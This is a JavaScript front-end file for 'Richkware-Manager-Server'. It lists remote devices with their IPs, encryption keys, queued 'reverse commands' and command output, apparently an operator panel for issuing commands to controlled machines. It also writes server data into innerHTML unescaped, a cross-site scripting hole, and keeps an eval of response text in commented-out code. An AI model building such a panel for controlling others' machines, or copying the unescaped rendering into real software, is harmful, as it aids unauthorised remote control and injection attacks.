function loadDevicesTable() {
    console.log("loadDevicesTable")
    $.get("devicesList", {channel: "webapp"}, function (data) {
        var JSONdata = JSON.parse(data)

        //device = JSON.parse(DeviceJSON);
        //document.getElementById("Email").innerHTML = Person.email;

        //status : "success", "notmodified", "error", "timeout", or "parsererror"
        if (JSONdata.statusCode == 1000) {
            var devices = JSONdata.message
            loadDevicesJSONtoTable(devices)
        } else if (JSONdata.statusCode == 2100) {
            alert("You are not logged in. You are being redirected to the Login Page");
            window.location.replace = "/Richkware-Manager-Server/login.html";
        } else {
            alert(JSONdata.message)
        }
    })
}

function createDevicesTableHeader() {
    console.log("createDevicesTableHeader")
    var devicesTable = document.getElementById("devicesTable");
    devicesTable.innerHTML = "";

    var thead = document.createElement("thead");
    var row = document.createElement("tr");
    row.innerHTML = ( //"<th>Index</th>" +
        "<th>Name</th>" +
        "<th>IP</th>" +
        "<th>Server Port</th>" +
        "<th>Last Connection</th>" +
        "<th>Encryption Key</th>" +
        "<th>User Associated</th>" +
        "<th>Commands</th>" +
        "<th>Commands Output</th>");

    thead.appendChild(row);
    devicesTable.appendChild(thead);
    console.log("tableHeader")
}

function loadDevicesJSONtoTable(devicesListJSON) {
    console.log("loadDevicesJSONtoTable")
    createDevicesTableHeader();

    var devicesList = JSON.parse(devicesListJSON)//jQuery.parseJSON(devicesListJSON);

    var tbody = document.createElement("tbody");

    console.log("devicesList: " + devicesList + " type: " + typeof(devicesList) + " length: " + devicesList.length)
    //var index = 0;
    //while (devicesList[index] != null) {
    //for(var device in devicesList){
    for (var i = 0; i < devicesList.length; ++i) {
//        $.each(devicesList, function (index, value) {
        //var device = devicesList[index];
//            var device = value;
        console.log(devicesList[i])

        var name = devicesList[i].name;
        var IP = devicesList[i].ip;
        var serverPort = devicesList[i].serverPort;
        var lastConnection = devicesList[i].lastConnection;
        var encryptionKey = devicesList[i].encryptionKey;
        var userAssociated = devicesList[i].userAssociated;
        var commands = devicesList[i].commands;
        var commandsOutput = devicesList[i].commandsOutput;

        var row = document.createElement("tr");
        row.id = "tableRow" + i;

        row.innerHTML = (
            //"<td>" + (index + 1) + "</td>" +
            "<td>" + name + "</td>" +
            "<td>" + IP + "</td>" +
            "<td>" + serverPort + "</td>" +
            "<td>" + lastConnection + "</td>" +
            "<td>" + encryptionKey + "</td>" +
            "<td>" + userAssociated + "</td>" +
            "<td>" + commands + "</td>" +
            "<td>" + commandsOutput + "</td>" +
            "<td><button type=\"button\" id=\"manage#" + name + "\" class=\"btn btn-secondary\" onclick=\"openReverseCommands('" + name + "')\">Reverse Commands</button></td>" +
            "<td><button type=\"button\" id=\"commandsOutput#" + name + "\" class=\"btn btn-secondary\" onclick=\"openReverseCommandsOutput('" + name + "')\">Show Output</button></td>" +
            "<td><button type=\"button\" id=\"remove#" + name + "#" + i + "\" class=\"btn btn-warning\" onclick=\"deleteDevice('" + name + "', '" + i + "')\">Remove</button></td>");

        //        "<td><button type=\"button\" class=\"btn btn-warning\" onclick=\"location.href=\'/Richkware-Manager-Server/device?name=" + name + "\';\">Remove</button></td>");

        tbody.appendChild(row);
        //      index++
    }
    devicesTable.appendChild(tbody);
}

function openReverseCommands(name) {
    window.location.replace("/Richkware-Manager-Server/reverse-commands.html?device=" + name)
}

function openReverseCommandsOutput(deviceName) {
    window.location.replace("/Richkware-Manager-Server/reverse-commands-output.html?device=" + deviceName)
}

function deleteDevice(device, indexTableRow) {
    $.ajax({
        url: '/Richkware-Manager-Server/device?name=' + device,
        type: 'DELETE',
        success: function (result) {
            $("#tableRow" + indexTableRow).remove();
        }
    });
}

/*
function loadUsersTable() {
    createDevicesTableHeader();

    request = null;

    // microsoft explorer
    if (window.XMLHttpRequest)
        request = new XMLHttpRequest();
    else
        request = new ActiveXObject("Microsoft.XMLHTTP");

    request.onreadystatechange = newConnection;
    request.open("GET", "/Richkware-Manager-Server/DevicesList", true, null, null);

    request.send(null);
}


function newConnection() {
    if (request.readyState != 4) {
        //alert("request.readystate: "+ request.readystate)
        return;
    }
    if (request.status != 200) {
        alert("request.status :  " + request.status)
        return;
    }

    var JSON = request.responseText;
    var result;
    eval("result = " + JSON);

    loadUsersJSONtoTable(result);

}*/

$(document).ready(function() {
    loadDevicesTable();
    setInterval(loadDevicesTable, 30000);

    $("[id*=remove]").click(function () {
        var dev = event.target.id.split("#")[1];
        var index = event.target.id.split("#")[2];
        $.delete("device", {name: dev}, function () {
            $("#tableRow" + index).remove()
        })
    });

    $("[id*=manage]").click(function () {
        console.log("element clicked -> redirecting")
        var name = event.target.id.split("#")[1]
        window.location.replace = "/Richkware-Manager-Server/reverse-commands.html?device=" + name;
    });

    $("#refreshButton").click(function () {
        console.log("clicked refresh button")
        loadDevicesTable()
    })

    /* sc.onload = function () {
         document.getElementById("Logout").innerHTML = lang.logout;
         document.getElementById("Lang").innerHTML = lang.lang;
     };
     */

    /*
    function EditDevicesTableField(name, IP, serverPort, lastConnection) {
        var editForm = document.getElementById("EditForm");
        editForm.style.display = "inline";

        var editButton = document.getElementById("AddForm");
        //editButton.style.display = "none";

        document.getElementById("name_OE").value = name;
        document.getElementById("name_E").value = name;
        document.getElementById("IP_OE").value = IP;
        document.getElementById("IP_E").value = IP;
        document.getElementById("serverPort_OE").value = serverPort;
        document.getElementById("serverPort_E").value = serverPort;
        document.getElementById("lastConnection_OE").value = lastConnection;
        document.getElementById("lastConnection_E").value = lastConnection;
        document.getElementById("encryptionKey_OE").value = lastConnection;
        document.getElementById("encryptionKey_E").value = lastConnection;

    }*/




})